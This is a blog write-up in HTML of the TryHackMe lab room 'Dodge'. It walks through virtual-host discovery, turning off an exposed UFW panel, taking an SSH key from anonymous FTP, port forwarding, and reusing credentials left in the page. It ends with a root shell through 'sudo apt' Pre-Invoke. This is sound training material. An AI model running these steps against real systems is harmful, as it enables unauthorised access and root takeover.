@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dodge | JackHacksStuff</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --accent:     #ff6b35;
+    --accent-rgb: 255,107,53;
+    --bg:       #090b0e;
+    --surface:  #0e1116;
+    --surface2: #131820;
+    --border:   #1c2330;
+    --border2:  #26303f;
+    --blue:     #7b9cff;
+    --text:     #c5d4e8;
+    --muted:    #48586e;
+    --muted2:   #6b7f97;
+    --mono:     'IBM Plex Mono', monospace;
+    --sans:     'Syne', sans-serif;
+    --rail:     48px;
+    --content:  720px;
+  }
+
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+    opacity: 0.025;
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  .rail {
+    position: fixed;
+    top: 0; left: 0;
+    width: var(--rail);
+    height: 100vh;
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 1.5rem 0;
+    z-index: 100;
+    background: var(--bg);
+  }
+
+  .rail-logo {
+    writing-mode: vertical-rl;
+    transform: rotate(180deg);
+    font-family: var(--sans);
+    font-weight: 800;
+    font-size: 0.7rem;
+    letter-spacing: 0.15em;
+    color: #fff;
+    white-space: nowrap;
+    text-decoration: none;
+    margin-bottom: auto;
+  }
+
+  .rail-logo span { color: var(--accent); }
+
+  .rail-toc {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0;
+    margin: 2rem 0;
+    overflow: hidden;
+  }
+
+  .rail-line { width: 1px; flex: 1; background: var(--border); }
+
+  .rail-tick {
+    width: 6px; height: 1px;
+    background: var(--border2);
+    flex-shrink: 0;
+    transition: background 0.3s;
+    cursor: pointer;
+  }
+
+  .rail-tick.active { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
+
+  .rail-bottom {
+    font-size: 0.6rem;
+    color: var(--muted);
+    writing-mode: vertical-rl;
+    transform: rotate(180deg);
+    letter-spacing: 0.1em;
+  }
+
+  main { margin-left: var(--rail); }
+
+  nav {
+    position: sticky;
+    top: 0; z-index: 90;
+    background: rgba(9,11,14,0.92);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 3rem;
+    height: 56px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .nav-back {
+    font-size: 0.75rem;
+    color: var(--muted2);
+    text-decoration: none;
+    letter-spacing: 0.08em;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    transition: color 0.2s;
+  }
+
+  .nav-back:hover { color: var(--accent); }
+
+  .nav-meta {
+    font-size: 0.7rem;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    gap: 1.5rem;
+  }
+
+  .nav-badge {
+    font-size: 0.6rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 0.15rem 0.5rem;
+    border: 1px solid var(--accent);
+    color: var(--accent);
+  }
+
+  .wu-header {
+    padding: 5rem 3rem 3.5rem;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .wu-header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(var(--border) 1px, transparent 1px),
+      linear-gradient(90deg, var(--border) 1px, transparent 1px);
+    background-size: 60px 60px;
+    opacity: 0.3;
+    mask-image: radial-gradient(ellipse 70% 100% at 90% 50%, black 0%, transparent 100%);
+  }
+
+  .wu-header::after {
+    content: '';
+    position: absolute;
+    bottom: -1px; left: 3rem;
+    width: 80px; height: 1px;
+    background: var(--accent);
+    box-shadow: 0 0 12px rgba(var(--accent-rgb), 0.6);
+  }
+
+  .wu-eyebrow {
+    font-size: 0.65rem;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 1.25rem;
+    position: relative;
+  }
+
+  .wu-title {
+    font-family: var(--sans);
+    font-weight: 800;
+    font-size: clamp(2.5rem, 7vw, 5rem);
+    color: #fff;
+    line-height: 0.95;
+    letter-spacing: -0.02em;
+    position: relative;
+    margin-bottom: 2rem;
+  }
+
+  .wu-meta-row {
+    display: flex;
+    gap: 2rem;
+    flex-wrap: wrap;
+    position: relative;
+  }
+
+  .wu-meta-item {
+    display: flex;
+    flex-direction: column;
+    gap: 0.25rem;
+  }
+
+  .wu-meta-label {
+    font-size: 0.6rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .wu-meta-value {
+    font-size: 0.8rem;
+    color: var(--text);
+  }
+
+  .wu-meta-value.accent { color: var(--accent); }
+
+  .tool-row {
+    display: flex;
+    gap: 0.4rem;
+    flex-wrap: wrap;
+    padding: 1.25rem 3rem;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface);
+  }
+
+  .tool-tag {
+    font-size: 0.62rem;
+    letter-spacing: 0.06em;
+    color: var(--muted2);
+    background: var(--border);
+    padding: 0.2rem 0.5rem;
+  }
+
+  .wu-body {
+    max-width: calc(var(--content) + 6rem);
+    padding: 4rem 3rem;
+    margin: 0 auto;
+  }
+
+  .wu-body h2 {
+    font-family: var(--mono);
+    font-weight: 500;
+    font-size: 0.78rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin: 3rem 0 1.25rem;
+    padding-top: 3rem;
+    border-top: 1px solid var(--border);
+    scroll-margin-top: 80px;
+  }
+
+  .wu-body h2:first-child { margin-top: 0; padding-top: 0; border-top: none; }
+
+  .wu-body h3 {
+    font-family: var(--sans);
+    font-weight: 700;
+    font-size: 1rem;
+    color: #fff;
+    margin: 1.5rem 0 0.75rem;
+  }
+
+  .wu-body p {
+    font-size: 0.82rem;
+    color: var(--muted2);
+    line-height: 2;
+    margin-bottom: 1rem;
+  }
+
+  .wu-body p strong { color: var(--text); font-weight: 500; }
+  .wu-body p code {
+    background: var(--surface);
+    color: var(--accent);
+    padding: 0.1em 0.35em;
+    font-size: 0.85em;
+    border: 1px solid var(--border);
+  }
+
+  .wu-body ol, .wu-body ul {
+    font-size: 0.82rem;
+    color: var(--muted2);
+    line-height: 2;
+    margin-bottom: 1rem;
+    padding-left: 1.5rem;
+  }
+
+  .wu-body ol li, .wu-body ul li {
+    margin-bottom: 0.5rem;
+  }
+
+  .wu-body ol li strong, .wu-body ul li strong {
+    color: var(--text);
+    font-weight: 500;
+  }
+
+  .wu-body ol code, .wu-body ul code {
+    background: var(--surface);
+    color: var(--accent);
+    padding: 0.1em 0.35em;
+    font-size: 0.85em;
+    border: 1px solid var(--border);
+  }
+
+  .wu-body pre {
+    background: var(--surface);
+    border-left: 2px solid var(--accent);
+    padding: 1rem 1.25rem;
+    overflow-x: auto;
+    margin: 1rem 0;
+    font-size: 0.76rem;
+    line-height: 1.7;
+    color: var(--text);
+  }
+
+  .wu-body pre code {
+    background: none;
+    padding: 0;
+    color: inherit;
+    border: none;
+    font-size: inherit;
+  }
+
+  .flag-box {
+    background: var(--surface);
+    border: 1px solid var(--accent);
+    padding: 0.85rem 1.25rem;
+    margin: 1.25rem 0;
+    display: flex;
+    flex-direction: column;
+    gap: 0.3rem;
+  }
+
+  .flag-box .flag-label {
+    font-size: 0.62rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .flag-box .flag-value {
+    color: var(--accent);
+    font-size: 0.82rem;
+    word-break: break-all;
+  }
+
+  .takeaway {
+    background: rgba(var(--accent-rgb), 0.04);
+    border-left: 2px solid var(--accent);
+    padding: 0.85rem 1.1rem;
+    margin: 1rem 0;
+    font-size: 0.8rem;
+    color: var(--muted2);
+    line-height: 1.8;
+  }
+
+  .takeaway strong { color: var(--text); font-weight: 500; }
+
+  .dead-end {
+    background: rgba(255,255,255,0.02);
+    border-left: 2px solid var(--border2);
+    padding: 0.85rem 1.1rem;
+    margin: 1rem 0;
+    font-size: 0.8rem;
+    color: var(--muted);
+    line-height: 1.8;
+  }
+
+  .dead-end::before {
+    content: '✗ dead end — ';
+    font-size: 0.65rem;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    display: block;
+    margin-bottom: 0.3rem;
+    color: var(--muted);
+  }
+
+  .note {
+    background: rgba(123,156,255,0.04);
+    border-left: 2px solid var(--blue);
+    padding: 0.85rem 1.1rem;
+    margin: 1rem 0;
+    font-size: 0.8rem;
+    color: var(--muted2);
+    line-height: 1.8;
+  }
+
+  .note strong { color: #9fb8ff; font-weight: 500; }
+
+  figure {
+    margin: 1.5rem 0;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+
+  figure img {
+    width: 100%;
+    display: block;
+  }
+
+  figcaption {
+    padding: 0.5rem 1rem;
+    font-size: 0.7rem;
+    color: var(--muted);
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+  }
+
+  figcaption code {
+    background: var(--bg);
+    color: var(--accent);
+    padding: 0.1em 0.35em;
+    font-size: 0.85em;
+    border: 1px solid var(--border);
+  }
+
+.wu-footer {
+    border-top: 1px solid var(--border);
+    margin: 0 3rem;
+    padding: 2.5rem 0;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 1rem;
+  }
+
+  .footer-nav-link {
+    display: flex;
+    flex-direction: column;
+    gap: 0.3rem;
+    text-decoration: none;
+    max-width: 220px;
+  }
+
+  .footer-nav-label {
+    font-size: 0.62rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .footer-nav-title {
+    font-family: var(--sans);
+    font-weight: 700;
+    font-size: 0.9rem;
+    color: var(--muted2);
+    transition: color 0.2s;
+  }
+
+  .footer-nav-link:hover .footer-nav-title { color: var(--accent); }
+
+  .footer-nav-link.next { text-align: right; }
+
+  .footer-center {
+    font-size: 0.7rem;
+    color: var(--muted);
+  }
+
+  .footer-center a {
+    color: var(--muted2);
+    text-decoration: none;
+    transition: color 0.2s;
+  }
+
+
+  .footer-center a {
+    color: var(--muted2);
+    text-decoration: none;
+    transition: color 0.2s;
+  }
+
+  .footer-center a:hover { color: var(--accent); }
+
+  @media (max-width: 768px) {
+    :root { --rail: 0px; }
+    .rail { display: none; }
+    main { margin-left: 0; }
+    nav, .wu-header, .tool-row { padding-left: 1.5rem; padding-right: 1.5rem; }
+    .wu-body { padding: 2.5rem 1.5rem; }
+    .wu-footer { margin: 0 1.5rem; }
+    .wu-title { font-size: 2.5rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="vhosts"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="cmd-discovery"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="firewall"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="ftp"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="notes"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="privesc"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="flags"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="takeaways"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Medium</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge">Medium</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · web exploitation · privilege escalation</div>
+    <h1 class="wu-title">Dodge</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-07-15</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent">Medium</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">2</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">virtual host enumeration</span>
+    <span class="tool-tag">UFW abuse</span>
+    <span class="tool-tag">FTP</span>
+    <span class="tool-tag">SSH</span>
+    <span class="tool-tag">port forwarding</span>
+    <span class="tool-tag">sudo apt</span>
+  </div>
+
+  <div class="wu-body">
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>Dodge</strong> is a TryHackMe room that tests your ability to move through various services and avoid network controls. The name suggests our goal: we must bypass the firewall, avoid the easy attack paths, and steer clear of distractions.</p>
+    <p>
+      The room is rated <strong>Medium</strong> and includes:
+    </p>
+    <ul>
+      <li>Finding virtual hosts from an SSL certificate</li>
+      <li>Turning off UFW to reveal an FTP service</li>
+      <li>Retrieving SSH keys from an anonymous FTP server</li>
+      <li>Port forwarding to access an internal notes application</li>
+      <li>Chaining credentials to escalate to another user</li>
+      <li>Using <code>apt</code> to gain a root shell</li>
+    </ul>
+
+    <h2 id="recon">// Phase 1: Reconnaissance</h2>
+
+    <p>We start with a standard Nmap scan. The <code>-sC</code> flag runs default scripts, <code>-sV</code> performs version detection, and <code>-p-</code> scans all 65,535 ports.</p>
+
+    <pre>nmap -sC -sV -p- &lt;target_ip&gt;</pre>
+
+    <p>Three ports are open:</p>
+
+    <pre>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu
+80/tcp  open  http     Apache httpd 2.4.41
+443/tcp open  ssl/http Apache httpd 2.4.41
+
+SSL Certificate Subject Alternative Names:
+DNS:dodge.thm
+DNS:www.dodge.thm
+DNS:blog.dodge.thm
+DNS:dev.dodge.thm
+DNS:touch-me-not.dodge.thm
+DNS:netops-dev.dodge.thm
+DNS:ball.dodge.thm</pre>
+
+    <p>Visiting the IP directly returns a <strong>403 Forbidden</strong>. This is common when a server uses <strong>virtual hosts</strong>; it cannot determine which site to serve based on the IP alone.</p>
+
+    <div class="note">
+      <strong>Virtual Hosting 101:</strong> A single server can host multiple websites by checking the <code>Host</code> header in the HTTP request. If you access the site by IP, the server returns a default page, often a 403 error.
+    </div>
+
+    <p>The SSL certificate gives us a list of virtual hosts. We add them to <code>/etc/hosts</code>:</p>
+
+    <pre>&lt;target_ip&gt; dodge.thm www.dodge.thm blog.dodge.thm dev.dodge.thm touch-me-not.dodge.thm netops-dev.dodge.thm ball.dodge.thm</pre>
+
+    <h2 id="vhosts">// Phase 2: Virtual Host Enumeration</h2>
+
+    <p>
+      We test each subdomain over HTTPS:
+    </p>
+
+    <pre>for sub in www blog dev touch-me-not netops-dev ball dodge; do
+    echo -n "https://$sub.dodge.thm: "
+    curl -k -s -o /dev/null -w "%{http_code}\n" https://$sub.dodge.thm
+done</pre>
+
+    <p>
+      Three subdomains return <code>200 OK</code>:
+    </p>
+
+    <pre>https://www.dodge.thm: 200
+https://blog.dodge.thm: 403
+https://dev.dodge.thm: 200
+https://touch-me-not.dodge.thm: 403
+https://netops-dev.dodge.thm: 200
+https://ball.dodge.thm: 403
+https://dodge.dodge.thm: 000</pre>
+
+    <ul>
+      <li>
+        <strong><code>www.dodge.thm</code></strong>, a static corporate site.
+      </li>
+      <li>
+        <strong><code>dev.dodge.thm</code></strong>, an exposed <code>phpinfo()</code> page.
+      </li>
+      <li>
+        <strong><code>netops-dev.dodge.thm</code></strong>, a firewall management page. This is where the action is.
+      </li>
+    </ul>
+
+    <div class="dead-end">
+      <strong>Touch-me-not, ball, and blog</strong> all return <code>403 Forbidden</code>. They're likely honeypots or inactive vhosts; we will ignore them.
+    </div>
+
+    <h2 id="cmd-discovery">// Phase 3: Discovering the Firewall Endpoint</h2>
+
+    <p>Visiting <code>netops-dev.dodge.thm</code> shows a blank page. However, the page source reveals two JavaScript files:</p>
+
+    <pre>&lt;script src='cf.js'&gt;&lt;/script&gt;
+&lt;script src="firewall.js"&gt;&lt;/script&gt;</pre>
+
+    <p>When checking <code>firewall.js</code>, it makes a request to <code> firewall10110.php</code>:</p>
+
+    <pre>fetch('firewall10110.php', {
+      method: 'GET',
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    })</pre>
+
+    <p>Going to <code>/firewall10110.php</code> shows a firewall management interface that accepts UFW commands:</p>
+
+    <figure>
+      <img src="images/dodge/firewall-before.png" alt="Firewall management page before disabling UFW">
+      <figcaption><em>Figure 1: UFW is active, and port 21 is denied.</em></figcaption>
+    </figure>
+
+    <p>The rule table indicates that port <strong>21 (FTP) is denied</strong>. Instead of struggling with the interface, we simply run <code>sudo ufw disable</code> to turn the firewall off entirely:</p>
+
+    <figure>
+      <img src="images/dodge/firewall-after.png" alt="Firewall status showing inactive">
+      <figcaption><em>Figure 2: UFW disabled, all ports are now accessible.</em></figcaption>
+    </figure>
+
+    <div class="takeaway">
+      <strong>"Dodge" the firewall.</strong> The room name suggests this. We don't need to hack the firewall; we only need to turn it off. This teaches us an important lesson: sometimes the easiest way is to use a tool as it was meant to be used.
+    </div>
+
+    <p>With the firewall disabled, we rescan the target:</p>
+
+    <pre>PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp      vsftpd 2.0.8 or later
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu
+80/tcp  open  http     Apache httpd 2.4.41
+443/tcp open  ssl/http Apache httpd 2.4.41</pre>
+
+    <p>Port 21 (FTP) is now open. It's time to investigate.</p>
+
+    <h2 id="ftp">// Phase 4: FTP & SSH Keys</h2>
+
+    <p>We connect to the FTP service using <strong>anonymous</strong> login:</p>
+
+    <pre>ftp &lt;target_ip&gt;
+Name: anonymous
+Password: (blank)</pre>
+
+    <p>A successful login shows that anonymous access is enabled. We list the directory:</p>
+
+    <pre>ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||22979|)
+150 Here comes the directory listing.
+drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 .
+drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 ..
+-rwxr-xr-x    1 1003     1003           87 Jun 29  2023 .bash_history
+-rwxr-xr-x    1 1003     1003          220 Feb 25  2020 .bash_logout
+-rwxr-xr-x    1 1003     1003         3771 Feb 25  2020 .bashrc
+drwxr-xr-x    2 1003     1003         4096 Jun 19  2023 .cache
+drwxr-xr-x    3 1003     1003         4096 Jun 19  2023 .local
+-rwxr-xr-x    1 1003     1003          807 Feb 25  2020 .profile
+drwxr-xr-x    2 1003     1003         4096 Jun 22  2023 .ssh
+-r--------    1 1003     1003           38 Jun 19  2023 user.txt
+226 Directory send OK.</pre>
+
+    <p>This is a user's home directory. The <code>.ssh</code> folder holds SSH keys. We navigate into it:</p>
+
+    <pre>ftp&gt; cd .ssh
+250 Directory successfully changed.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||62353|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 1003     1003          573 Jun 22  2023 authorized_keys
+-r--------    1 1003     1003         2610 Jun 22  2023 id_rsa
+-rwxr-xr-x    1 1003     1003         2610 Jun 22  2023 id_rsa_backup
+226 Directory send OK.</pre>
+
+    <div class="note">
+      <strong>Why not use <code>id_rsa</code>?</strong> It's only readable by the owner (permission <code>-r--------</code>). The backup key has permissions <code>-rwxr-xr-x</code>, which allows anyone to read it.
+    </div>
+
+    <p>We download <code>id_rsa_backup</code> and <code>authorized_keys</code>:</p>
+
+    <pre>ftp&gt; get id_rsa_backup
+ftp&gt; get authorized_keys</pre>
+
+    <p>The <code>authorized_keys</code> file contains the username:</p>
+
+    <pre>ssh-rsa AAAAB3... challenger@thm-lamp</pre>
+
+    <p>We now have an SSH key and a username. We set the correct permissions and connect:</p>
+
+    <pre>chmod 600 id_rsa_backup
+ssh -i id_rsa_backup challenger@&lt;target_ip&gt;</pre>
+
+    <p>To read the user flag:</p>
+
+    <pre>challenger@ip-10-112-150-79:~$ cat user.txt</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">User Flag</span>
+      <span class="flag-value">THM{0649...}</span>
+    </div>
+
+    <h2 id="notes">// Phase 5: The Notes Application</h2>
+
+    <p>Now that we're inside as <code>challenger</code>, we need to escalate privileges. We start by checking the listening ports:</p>
+
+    <pre>ss -tln | grep LISTEN</pre>
+
+    <p>Port <strong>10000</strong> is listening only on localhost:</p>
+
+    <pre>tcp   LISTEN 0  511  127.0.0.1:10000  0.0.0.0:*</pre>
+
+    <p>This is likely a web application. We find the Apache config for it:</p>
+
+    <pre>cat /etc/apache2/sites-enabled/notes.conf</pre>
+
+    <pre>&lt;VirtualHost 127.0.0.1:10000&gt;
+    DocumentRoot /var/www/notes
+&lt;/VirtualHost&gt;</pre>
+
+    <p>We need to access this internal service. We use <strong>SSH port forwarding</strong>:</p>
+
+    <pre>ssh -i id_rsa_backup -L 10000:127.0.0.1:10000 challenger@&lt;target_ip&gt;</pre>
+
+    <p>Now we can access <code>http://localhost:10000</code> from our attacker machine. When we browse to it, we see a notes application:
+    </p>
+
+    <figure>
+      <img src="images/dodge/notes-welcome.png" alt="MyNotes welcome page">
+      <figcaption><em>Figure 3: The notes application running on port 10000.</em></figcaption>
+    </figure>
+
+    <p>Viewing the page source of <code>/public/html/login.php</code> reveals an interesting clue, hardcoded credentials in HTML comments:
+    </p>
+
+    <pre>&lt;!-- &lt;input type="text" id="username" name="username" value="gabriela"&gt; --&gt;
+&lt;!-- &lt;input type="password" id="password" name="password" value="&lt;redacted&gt"&gt; --&gt;</pre>
+
+    <p>These work! We log in as <code>gabriela</code> and see a dashboard. It displays credentials for another user:</p>
+
+    <figure>
+      <img src="images/dodge/gabriela-dashboard.png" alt="Gabriela's dashboard showing cobra credentials">
+      <figcaption><em>Figure 4: The dashboard contains credentials for <code>cobra</code>.</em></figcaption>
+    </figure>
+
+    <pre>cobra / &lt;redacted&gt;</pre>
+
+    <div class="note">
+      <strong>Credential Chaining:</strong> This is a common CTF pattern. One set of credentials leads to another. Always follow the chain.
+    </div>
+
+    <h2 id="privesc">// Phase 6: Privilege Escalation</h2>
+
+    <p>
+      The credentials work for <code>su</code>:
+    </p>
+
+    <pre>su - cobra
+Password: <redacted></pre>
+
+    <p>
+      As <code>cobra</code>, we check sudo permissions:
+    </p>
+
+    <pre>cobra@ip-10-112-187-129:~$ sudo -l
+
+Matching Defaults entries for cobra on ip-10-112-187-129:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User cobra may run the following commands on ip-10-112-187-129:
+    (ALL) NOPASSWD: /usr/bin/apt</pre>
+
+    <p>This is a well-known privilege escalation method. The
+<code>Pre-Invoke</code> option allows us to run arbitrary commands before an <code>apt</code> operation:</p>
+
+    <pre>sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh</pre>
+
+    <p>This drops us into a root shell. From there, we read the root flag:</p>
+
+    <pre># cat /root/root.txt</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">Root Flag</span>
+      <span class="flag-value">THM{7b88...}</span>
+    </div>
+
+    <h2 id="takeaways">// Key Takeaways</h2>
+
+    <div class="takeaway">
+      <strong>Virtual hosts are everywhere.</strong> Always check SSL certificates and DNS records for subdomains. The first foothold often comes from a vhost you didn't expect.
+    </div>
+
+    <div class="takeaway">
+      <strong>Firewalls are just rules.</strong> If you can control the firewall, you can disable it. This room cleverly uses UFW as both the defense and the attack method.
+    </div>
+
+    <div class="takeaway">
+      <strong>Port forwarding is essential.</strong> Internal services bound to localhost often contain the next piece of the puzzle. Learning to forward ports with SSH or <code>socat</code> is necessary.
+    </div>
+
+    <div class="takeaway">
+      <strong>Credential chaining is common.</strong> One set of credentials leads to another. Always follow the chain, it's one of the most reliable ways to escalate privileges in CTFs and real-world pentests.
+    </div>
+
+    <div class="takeaway">
+      <strong><code>apt</code> is a powerful escalation method.</strong> The <code>Pre-Invoke</code> option allows arbitrary command execution. This is a well-known technique worth memorizing for any Linux privilege escalation checklist.
+    </div>
+
+  </div>
+
+  <div class="wu-footer">
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+    <a href="lofi.html" class="footer-nav-link next">
+      <span class="footer-nav-label">Next →</span>
+      <span class="footer-nav-title">Lo-Fi</span>
+    </a>
+  </div>
+
+</main>
+
+<script>
+  const headings = document.querySelectorAll('.wu-body h2[id]');
+  const ticks = document.querySelectorAll('.rail-tick[data-heading]');
+
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const id = entry.target.id;
+        ticks.forEach(t => t.classList.toggle('active', t.dataset.heading === id));
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+
+  headings.forEach(h => observer.observe(h));
+
+  ticks.forEach(tick => {
+    tick.addEventListener('click', () => {
+      const target = document.getElementById(tick.dataset.heading);
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
+</body>
+</html>
